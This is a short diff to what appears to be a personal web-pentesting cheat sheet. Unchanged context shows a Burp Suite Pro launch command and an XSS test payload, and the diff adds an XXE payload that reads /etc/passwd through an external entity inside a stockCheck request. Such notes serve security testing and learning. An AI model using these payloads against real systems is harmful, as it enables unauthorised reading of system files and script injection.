@@ -72,6 +72,17 @@ java -jar -Xmx512M -Djava.awt.headless=true ./burpsuite_pro_v1.8.8.jar http exmp
   content-type: application/json
   {"description":"<script>alert(\"hossam\");</script>"}
 
+
+-------------------------------------------------------------------------------------------
+                                    XXE
+    
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>    
+<stockCheck>
+<productId>
+&xxe;
+</productId><storeId>1</storeId></stockCheck>
+
   
   
 
